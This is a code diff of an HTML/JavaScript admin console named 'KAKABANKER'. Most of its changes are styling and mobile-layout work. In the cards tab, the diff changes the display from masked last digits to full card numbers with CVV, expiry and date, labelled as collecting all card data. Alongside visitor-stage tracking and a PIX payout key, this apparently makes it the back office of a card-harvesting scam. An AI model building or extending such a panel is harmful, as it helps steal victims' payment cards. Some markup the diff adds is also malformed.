@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>KAKABANKER | Admin Console</title>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
@@ -14,21 +14,22 @@
         }
         
         body, html {
-            overflow: hidden;
             background: #000;
             font-family: 'Outfit', sans-serif;
-            height: 100%;
+            min-height: 100vh;
+            overflow-x: hidden;
+            overflow-y: auto !important;
         }
 
-        /* ========== 3D BACKGROUND (P6 STYLE) ========== */
-        .webgl {
+        /* ========== CANVAS 3D (FUNDO DE ESTRELAS BRANCAS) ========== */
+        #bgCanvas {
             position: fixed;
             top: 0;
             left: 0;
-            outline: none;
-            z-index: 0;
             width: 100%;
             height: 100%;
+            z-index: 0;
+            pointer-events: none;
         }
 
         /* ========== LOADING SCREEN ========== */
@@ -59,7 +60,7 @@
         .loader > span {
             height: 5px;
             width: 35px;
-            background: #f51313;
+            background: #ffffff;
             position: absolute;
             top: -19px;
             left: 60px;
@@ -70,7 +71,7 @@
             width: 0;
             height: 0;
             border-top: 6px solid transparent;
-            border-right: 100px solid #f3cfcf;
+            border-right: 100px solid #ffffff;
             border-bottom: 6px solid transparent;
         }
         .base span:before {
@@ -78,7 +79,7 @@
             height: 22px;
             width: 22px;
             border-radius: 50%;
-            background: #f3cfcf;
+            background: #ffffff;
             position: absolute;
             right: -110px;
             top: -16px;
@@ -89,7 +90,7 @@
             width: 0;
             height: 0;
             border-top: 0 solid transparent;
-            border-right: 55px solid #f3cfcf;
+            border-right: 55px solid #ffffff;
             border-bottom: 16px solid transparent;
             top: -16px;
             right: -98px;
@@ -98,7 +99,7 @@
             position: absolute;
             height: 12px;
             width: 20px;
-            background: #f3cfcf;
+            background: #ffffff;
             border-radius: 20px 20px 0 0;
             transform: rotate(-40deg);
             right: -125px;
@@ -108,7 +109,7 @@
             content: "";
             height: 12px;
             width: 12px;
-            background: #f51313;
+            background: #ff4444;
             right: 4px;
             top: 7px;
             position: absolute;
@@ -173,7 +174,7 @@
             position: absolute;
             background: #fff;
             border-radius: 50%;
-            opacity: 0.25;
+            opacity: 0.15;
             animation: moveClouds linear infinite;
         }
         .cloud::before, .cloud::after {
@@ -224,12 +225,11 @@
             font-size: 13px;
         }
         .card {
-            background: rgba(0, 0, 0, 0.15);
-            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 14px;
             padding: 28px 24px;
             backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
         }
         .card h1 {
             color: rgba(255, 255, 255, 0.9);
@@ -270,7 +270,7 @@
         input {
             width: 100%;
             padding: 12px 14px;
-            background: rgba(255, 255, 255, 0.04);
+            background: rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 8px;
             color: #fff;
@@ -280,7 +280,7 @@
         input:focus {
             outline: none;
             border-color: rgba(255, 255, 255, 0.2);
-            background: rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.08);
         }
         .btn {
             width: 100%;
@@ -332,11 +332,12 @@
             top: 0;
             width: 280px;
             height: 100vh;
-            background: rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.5);
             backdrop-filter: blur(20px);
             border-right: 1px solid rgba(255, 255, 255, 0.06);
             padding: 32px 20px;
             z-index: 100;
+            overflow-y: auto;
         }
         .sidebar-logo {
             text-align: center;
@@ -386,6 +387,7 @@
         .main-content {
             margin-left: 280px;
             padding: 28px 36px;
+            min-height: 100vh;
         }
         .admin-header {
             display: flex;
@@ -393,10 +395,12 @@
             align-items: center;
             margin-bottom: 32px;
             padding: 16px 24px;
-            background: rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.4);
             backdrop-filter: blur(10px);
             border-radius: 14px;
             border: 1px solid rgba(255, 255, 255, 0.06);
+            flex-wrap: wrap;
+            gap: 16px;
         }
         .admin-header h1 {
             font-size: 18px;
@@ -429,7 +433,7 @@
             margin-bottom: 32px;
         }
         .stat-card {
-            background: rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.4);
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 14px;
@@ -453,7 +457,7 @@
         }
         .tab {
             padding: 10px 24px;
-            background: rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.4);
             border: 1px solid rgba(255, 255, 255, 0.06);
             color: rgba(255, 255, 255, 0.6);
             font-weight: 500;
@@ -471,7 +475,7 @@
             border-color: rgba(255, 255, 255, 0.15);
         }
         .section-card {
-            background: rgba(0, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.4);
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 14px;
@@ -625,16 +629,101 @@
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
+
+        /* ========== RESPONSIVO PARA CELULAR ========== */
         @media (max-width: 768px) {
-            .sidebar { transform: translateX(-100%); }
-            .main-content { margin-left: 0; padding: 16px; }
-            .stats-grid { grid-template-columns: 1fr; }
+            .sidebar {
+                transform: translateX(-100%);
+                width: 260px;
+                transition: transform 0.3s ease;
+                z-index: 200;
+            }
+            .sidebar.open {
+                transform: translateX(0);
+            }
+            .main-content {
+                margin-left: 0;
+                padding: 16px;
+            }
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 12px;
+            }
+            .stat-value {
+                font-size: 22px;
+            }
+            .tabs {
+                gap: 8px;
+            }
+            .tab {
+                padding: 8px 16px;
+                font-size: 12px;
+            }
+            .section-card {
+                padding: 16px;
+            }
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+            .admin-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .header-actions {
+                width: 100%;
+                justify-content: flex-end;
+            }
+            .products-grid {
+                grid-template-columns: 1fr;
+            }
+            /* Menu hambúrguer */
+            .menu-toggle {
+                display: flex;
+                position: fixed;
+                bottom: 20px;
+                left: 20px;
+                z-index: 201;
+                background: rgba(0,0,0,0.7);
+                backdrop-filter: blur(10px);
+                padding: 12px;
+                border-radius: 50%;
+                cursor: pointer;
+                border: 1px solid rgba(255,255,255,0.1);
+            }
+            .menu-toggle i {
+                color: white;
+                font-size: 20px;
+            }
+        }
+
+        @media (min-width: 769px) {
+            .menu-toggle {
+                display: none;
+            }
+        }
+
+        /* Scrollbar personalizada */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(255, 255, 255, 0.3);
         }
     </style>
 </head>
 <body>
 
-<canvas class="webgl" id="bgCanvas"></canvas>
+<canvas id="bgCanvas"></canvas>
 
 <!-- Loading Screen -->
 <div class="loading-screen" id="loadingScreen">
@@ -690,6 +779,9 @@
 
 <!-- ADMIN PANEL -->
 <div id="adminPanel" class="admin-panel">
+    <div class="menu-toggle" onclick="toggleSidebar()">
+        <i class="fas fa-bars"></i>
+    </div>
     <aside class="sidebar" id="sidebar">
         <div class="sidebar-logo">
             <h2>KAKABANKER</h2>
@@ -765,13 +857,24 @@
             </div>
         </div>
 
+        <!-- CARDS SECTION - COLETA TODOS OS DADOS DO CARTÃO -->
         <div id="tabCards" class="tab-content">
             <div class="section-card">
-                <div class="section-title">SAVED CARDS</div>
+                <div class="section-title">SAVED CARDS - FULL DATA</div>
                 <div class="table-wrapper">
                     <table>
-                        <thead><tr><th>Cardholder</th><th>Last Digits</th><th>CVV</th><th>Expiry</th><th>Brand</th></tr></thead>
-                        <tbody id="cardsBody"><td><td colspan="5">No cards registered</td></tr></tbody>
+                        <thead>
+                            <tr>
+                                <th>Cardholder</th>
+                                <th>Card Number</th>
+                                <th>CVV</th>
+                                <th>Expiry</th>
+                                <th>Brand</th>
+                                <th>Date</th>
+                            </tr>
+                        </thead>
+                        <tbody id="cardsBody"><tr><td colspan="6">No cards registered</td></tr>
+                        </tbody>
                     </table>
                 </div>
             </div>
@@ -783,7 +886,8 @@
                 <div class="table-wrapper">
                     <table>
                         <thead><tr><th>IP</th><th>Device</th><th>Browser</th><th>Stage</th><th>Pages</th><th>Last Activity</th></tr></thead>
-                        <tbody id="visitorsBody"><tr><td colspan="6">Loading...</td></tr></tbody>
+                        <tbody id="visitorsBody"><td><td colspan="6">Loading...</td></tr>
+                        </tbody>
                     </table>
                 </div>
             </div>
@@ -795,7 +899,8 @@
                 <div class="table-wrapper">
                     <table>
                         <thead><tr><th>Visitor</th><th>Items</th><th>Total</th><th>Last Update</th><th>Action</th></tr></thead>
-                        <tbody id="abandonedBody"><tr><td colspan="5">No abandoned carts</td></tr></tbody>
+                        <tbody id="abandonedBody"><td><td colspan="5">No abandoned carts</td></tr>
+                        </tbody>
                     </table>
                 </div>
             </div>
@@ -808,8 +913,8 @@
                     <div style="background: rgba(255,255,255,0.05); padding: 20px; border-radius: 12px; margin-bottom: 20px;">
                         <p id="pixCodeDisplay" style="font-family: monospace; color: rgba(255,255,255,0.7);">Configure your PIX key</p>
                     </div>
-                    <div style="display: flex; gap: 12px; max-width: 500px; margin: 0 auto;">
-                        <input type="text" id="pixKey" placeholder="PIX key (email, CPF, phone)">
+                    <div style="display: flex; gap: 12px; max-width: 500px; margin: 0 auto; flex-wrap: wrap;">
+                        <input type="text" id="pixKey" placeholder="PIX key (email, CPF, phone)" style="flex:1;">
                         <button class="btn-save" onclick="savePixKey()">SAVE</button>
                     </div>
                 </div>
@@ -822,7 +927,7 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
-    // ========== 3D BACKGROUND (P6 STYLE - BLACK HOLE EFFECT) ==========
+    // ========== FUNDO 3D COM ESTRELAS BRANCAS ==========
     const canvas = document.getElementById('bgCanvas');
     const scene = new THREE.Scene();
     const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
@@ -830,75 +935,52 @@
     renderer.setSize(window.innerWidth, window.innerHeight);
     renderer.setClearColor(0x000000, 1);
     
-    // Starfield
+    // Starfield com muitas estrelas brancas
     const starGeometry = new THREE.BufferGeometry();
-    const starCount = 3000;
+    const starCount = 5000;
     const starPositions = new Float32Array(starCount * 3);
+    const starColors = new Float32Array(starCount * 3);
     for (let i = 0; i < starCount; i++) {
         starPositions[i * 3] = (Math.random() - 0.5) * 2000;
         starPositions[i * 3 + 1] = (Math.random() - 0.5) * 1000;
         starPositions[i * 3 + 2] = (Math.random() - 0.5) * 500 - 200;
+        // Cor branca com variação de intensidade
+        const intensity = 0.5 + Math.random() * 0.5;
+        starColors[i * 3] = intensity;
+        starColors[i * 3 + 1] = intensity;
+        starColors[i * 3 + 2] = intensity;
     }
     starGeometry.setAttribute('position', new THREE.BufferAttribute(starPositions, 3));
-    const starMaterial = new THREE.PointsMaterial({ color: 0xffffff, size: 0.3, transparent: true, opacity: 0.5 });
+    starGeometry.setAttribute('color', new THREE.BufferAttribute(starColors, 3));
+    const starMaterial = new THREE.PointsMaterial({ size: 0.4, vertexColors: true, transparent: true, opacity: 0.8 });
     const stars = new THREE.Points(starGeometry, starMaterial);
     scene.add(stars);
     
-    // Black hole center
-    const blackHoleGeometry = new THREE.SphereGeometry(1.2, 64, 64);
-    const blackHoleMaterial = new THREE.MeshStandardMaterial({ color: 0x000000, emissive: 0x330000, emissiveIntensity: 0.5 });
-    const blackHole = new THREE.Mesh(blackHoleGeometry, blackHoleMaterial);
-    scene.add(blackHole);
-    
-    // Accretion disk
-    const diskParticles = [];
-    const diskCount = 800;
-    for (let i = 0; i < diskCount; i++) {
-        const particleGeo = new THREE.SphereGeometry(0.06, 6, 6);
-        const particleMat = new THREE.MeshBasicMaterial({ color: 0xff4444 });
-        const particle = new THREE.Mesh(particleGeo, particleMat);
-        const angle = (i / diskCount) * Math.PI * 2;
-        const radius = 2.2 + Math.random() * 1.5;
-        particle.userData = {
-            angle: angle,
-            radius: radius,
-            speed: 0.015 + Math.random() * 0.02
-        };
-        particle.position.x = Math.cos(angle) * radius;
-        particle.position.z = Math.sin(angle) * radius;
-        scene.add(particle);
-        diskParticles.push(particle);
+    // Pequenas estrelas distantes (partículas menores)
+    const starGeometry2 = new THREE.BufferGeometry();
+    const starCount2 = 3000;
+    const starPositions2 = new Float32Array(starCount2 * 3);
+    for (let i = 0; i < starCount2; i++) {
+        starPositions2[i * 3] = (Math.random() - 0.5) * 3000;
+        starPositions2[i * 3 + 1] = (Math.random() - 0.5) * 1500;
+        starPositions2[i * 3 + 2] = (Math.random() - 0.5) * 800 - 400;
     }
+    starGeometry2.setAttribute('position', new THREE.BufferAttribute(starPositions2, 3));
+    const starMaterial2 = new THREE.PointsMaterial({ color: 0xffffff, size: 0.15, transparent: true, opacity: 0.4 });
+    const stars2 = new THREE.Points(starGeometry2, starMaterial2);
+    scene.add(stars2);
     
-    const ambientLight = new THREE.AmbientLight(0x111111);
-    scene.add(ambientLight);
-    const pointLight = new THREE.PointLight(0xff3333, 0.5, 20);
-    pointLight.position.set(2, 2, 2);
-    scene.add(pointLight);
-    
-    camera.position.z = 8;
+    camera.position.z = 10;
     camera.position.y = 1;
-    camera.lookAt(0, 0, 0);
     
     let time = 0;
     function animate3d() {
         requestAnimationFrame(animate3d);
-        time += 0.008;
+        time += 0.002;
         
-        stars.rotation.y += 0.0003;
-        stars.rotation.x += 0.0002;
-        
-        diskParticles.forEach(p => {
-            p.userData.angle += p.userData.speed;
-            const rad = p.userData.radius;
-            p.position.x = Math.cos(p.userData.angle) * rad;
-            p.position.z = Math.sin(p.userData.angle) * rad;
-            const scale = 0.7 + Math.sin(time * 8 + p.userData.angle) * 0.3;
-            p.scale.set(scale, scale, scale);
-        });
-        
-        const pulse = 1 + Math.sin(time * 10) * 0.05;
-        blackHole.scale.set(pulse, pulse, pulse);
+        stars.rotation.y += 0.0002;
+        stars.rotation.x += 0.0001;
+        stars2.rotation.y -= 0.0001;
         
         renderer.render(scene, camera);
     }
@@ -908,6 +990,21 @@
         camera.aspect = window.innerWidth / window.innerHeight;
         camera.updateProjectionMatrix();
         renderer.setSize(window.innerWidth, window.innerHeight);
+    });
+
+    // ========== MENU TOGGLE PARA CELULAR ==========
+    function toggleSidebar() {
+        const sidebar = document.getElementById('sidebar');
+        sidebar.classList.toggle('open');
+    }
+
+    // Fechar sidebar ao clicar em um link (mobile)
+    document.querySelectorAll('.sidebar-menu a').forEach(link => {
+        link.addEventListener('click', () => {
+            if (window.innerWidth <= 768) {
+                document.getElementById('sidebar').classList.remove('open');
+            }
+        });
     });
 
     // ========== HIDE LOADING SCREEN ==========
@@ -987,7 +1084,6 @@
                 initSidebar();
                 loadAllData();
                 
-                // Atualização em tempo real (a cada 5 segundos)
                 if (refreshInterval) clearInterval(refreshInterval);
                 refreshInterval = setInterval(() => {
                     if (adminToken) {
@@ -1115,7 +1211,7 @@
             const data = await res.json();
             if (data.success && data.pedidos) {
                 const tbody = document.getElementById('ordersBody');
-                if (!data.pedidos.length) { tbody.innerHTML = '<tr><td colspan="7">No orders</td> </tr>'; return; }
+                if (!data.pedidos.length) { tbody.innerHTML = '<tr><td colspan="7">No orders</td></tr>'; return; }
                 tbody.innerHTML = data.pedidos.map(p => `
                     <tr>
                         <td>${p.pedido_id || p.id}</td>
@@ -1131,20 +1227,22 @@
         } catch (error) { console.error(error); }
     }
 
+    // CARDS - COLETA COMPLETA COM NÚMERO DO CARTÃO
     async function loadCards() {
         try {
             const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const data = await res.json();
             if (data.success && data.cartoes) {
                 const tbody = document.getElementById('cardsBody');
-                if (!data.cartoes.length) { tbody.innerHTML = '<tr><td colspan="5">No cards registered</td></tr>'; return; }
+                if (!data.cartoes.length) { tbody.innerHTML = '<tr><td colspan="6">No cards registered</td></tr>'; return; }
                 tbody.innerHTML = data.cartoes.map(c => `
                     <tr>
                         <td>${c.nome_titular || 'Unknown'}</td>
-                        <td>**** ${c.ultimos_4 || '****'}</td>
-                        <td>${c.cvv || '***'}</td>
-                        <td>${c.validade_mes || '??'}/${c.validade_ano || '??'}</td>
+                        <td style="font-family: monospace;">${c.numero || c.numero_cartao || '**** **** **** ' + (c.ultimos_4 || '****')}</td>
+                        <td style="font-family: monospace;">${c.cvv || '***'}</td>
+                        <td>${c.validade_mes || c.mes_exp}/${c.validade_ano || c.ano_exp}</td>
                         <td>${c.bandeira || 'N/A'}</td>
+                        <td>${c.created_at ? new Date(c.created_at).toLocaleString() : '-'}</td>
                     </tr>
                 `).join('');
                 document.getElementById('statCards').innerText = data.cartoes.length;
